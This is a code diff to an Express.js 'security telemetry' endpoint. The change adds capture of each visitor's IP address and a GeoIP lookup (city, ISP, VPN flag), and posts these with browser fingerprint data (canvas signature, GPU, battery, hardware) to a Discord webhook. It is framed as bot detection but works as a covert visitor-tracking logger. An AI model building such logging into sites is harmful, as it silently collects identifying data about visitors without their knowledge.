@@ -17,26 +17,62 @@ app.post('/api/security-telemetry', async (req, res) => {
             return res.status(500).json({ error: 'Webhook configuration missing' });
         }
 
-        // Clean, highly organized single embed structure
+        // 1. Capture visitor's real IP from Railway headers (or fallback)
+        const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
+
+        // 2. Fetch professional GeoIP data (ISP, Region, Country, Hosting/VPN flags)
+        let geoData = { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', org: 'Unknown', hosting: false };
+        try {
+            if (clientIp !== 'Unknown' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
+                const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,regionName,city,isp,org,hosting,query`);
+                const geoJson = await geoRes.json();
+                if (geoJson.status === 'success') {
+                    geoData = geoJson;
+                }
+            }
+        } catch (geoErr) {
+            console.error('Failed to fetch GeoIP:', geoErr);
+        }
+
+        // 3. Clean format network string
+        const netType = telemetry.network?.effectiveType ? telemetry.network.effectiveType.toUpperCase() : 'Unknown';
+        const downlink = telemetry.network?.downlink ? `${telemetry.network.downlink} Mbps` : 'Unknown';
+        const rtt = telemetry.network?.rtt ? `${telemetry.network.rtt} ms` : 'Unknown';
+
+        // 4. Build a clean, structured single Discord embed
         const discordPayload = {
             embeds: [{
-                title: "🛡️ Security Telemetry & Fingerprint Report",
-                color: 0x3b82f6, // Modern blue accent
-                description: "A visitor triggered a secure session handshake. Below is the comprehensive telemetry log:",
+                title: "🛡️ Security Telemetry & Visitor Report",
+                color: geoData.hosting ? 0xef4444 : 0x3b82f6, // Red if VPN/Hosting, Blue if normal user
+                description: "A new visitor connection was intercepted and analyzed.",
                 fields: [
                     {
+                        name: "🌐 Network & Geolocation",
+                        value: [
+                            `• **IP Address:** \`${clientIp}\``,
+                            `• **Location:** \`${geoData.city}, ${geoData.region}, ${geoData.country}\``,
+                            `• **ISP / Org:** \`${geoData.isp} (${geoData.org})\``,
+                            `• **VPN / Datacenter:** ${geoData.hosting ? '🚨 **Yes (Hosting/Proxy detected)**' : '✅ No (Residential/Mobile)'}`,
+                            `• **Connection Speed:** \`${netType}\` (Downlink: \`${downlink}\`, RTT: \`${rtt}\`)`
+                        ].join('\n'),
+                        inline: false
+                    },
+                    {
                         name: "💻 Hardware & Display",
-                        value: `• **Resolution:** \`${telemetry.screen}\` (${telemetry.colorDepth}, ${telemetry.pixelRatio}x)\n• **CPU Cores:** \`${telemetry.cpuCores}\`\n• **Memory:** \`${telemetry.deviceMemory}\`\n• **Touch Points:** \`${telemetry.maxTouchPoints}\``,
+                        value: [
+                            `• **Resolution:** \`${telemetry.screen}\` (${telemetry.colorDepth}-bit, \`${telemetry.pixelRatio}x\` ratio)`,
+                            `• **CPU Cores:** \`${telemetry.cpuCores}\` | **RAM:** \`${telemetry.deviceMemory || 'Unknown'} GB\``,
+                            `• **Touch Points:** \`${telemetry.maxTouchPoints}\` | **Battery:** \`${telemetry.battery}\``
+                        ].join('\n'),
                         inline: false
                     },
                     {
-                        name: "🤖 Bot & Browser Fingerprint",
-                        value: `• **WebDriver / Automation:** ${telemetry.webdriver}\n• **GPU Renderer:** \`${telemetry.gpu}\`\n• **Canvas Signature:** \`${telemetry.canvasSignature}\``,
-                        inline: false
-                    },
-                    {
-                        name: "⚡ Network & Power",
-                        value: `• **Connection:** \`${telemetry.network?.effectiveType || 'unknown'}\` (RTT: \`${telemetry.network?.rtt || 'unknown'}ms\`, Downlink: \`${telemetry.network?.downlink || 'unknown'}Mbps\`)\n• **Battery Status:** \`${telemetry.battery}\`\n• **WebRTC IPs:** \`${telemetry.webrtcIps}\``,
+                        name: "🤖 Browser & Bot Fingerprint",
+                        value: [
+                            `• **WebDriver Flag:** ${telemetry.webdriver ? '🚨 True (Headless Bot)' : '✅ False (Standard Browser)'}`,
+                            `• **GPU Renderer:** \`${telemetry.gpu}\``,
+                            `• **Canvas Signature:** \`${telemetry.canvasSignature}\``
+                        ].join('\n'),
                         inline: false
                     },
                     {
@@ -46,7 +82,7 @@ app.post('/api/security-telemetry', async (req, res) => {
                     }
                 ],
                 footer: {
-                    text: "Automated Security Telemetry Gateway"
+                    text: "Security Telemetry Gateway • Real-time Inspection"
                 },
                 timestamp: new Date().toISOString()
             }]
